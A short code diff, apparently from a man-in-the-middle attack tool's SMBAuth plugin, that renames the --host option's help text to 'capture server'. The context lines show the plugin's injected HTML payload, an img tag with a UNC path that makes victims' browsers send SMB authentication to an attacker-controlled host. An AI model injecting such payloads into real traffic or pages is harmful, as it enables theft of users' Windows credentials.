@@ -12,7 +12,7 @@ class SMBAuth(Inject,Plugin):
         self.html_payload = self._get_data()
 
     def add_options(self,options):
-        options.add_argument("--host", action="store_true", help="The ip address of the SMB server")
+        options.add_argument("--host", action="store_true", help="The ip address of your capture server")
     
     def _get_data(self):
         return '<img src=\"\\\\%s\\image.jpg\">'\
